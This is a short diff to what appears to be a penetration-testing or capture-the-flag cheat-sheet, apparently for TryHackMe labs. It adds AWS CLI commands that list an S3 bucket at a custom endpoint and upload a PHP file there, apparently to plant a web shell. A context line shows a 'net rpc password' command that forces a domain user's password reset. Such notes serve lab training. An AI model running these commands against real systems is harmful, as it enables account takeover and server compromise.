@@ -146,3 +146,10 @@ IconIndex=1
 net rpc password "$username_of_forced" "$desired_password" -u "thm.corp"/"$privileged_username"%"$password" -S "$IP"           
 
 ```
+
+# AWS
+```
+aws --endpoint=http://domain.brnyr/ s3 ls
+aws --endpoint=http://domain.brnyr/ s3 ls s3://domain.brnyr
+aws  --endpoint=http://domain.brnyr/ s3 cp afile_toupload.php s3://domain.brnyr
+```
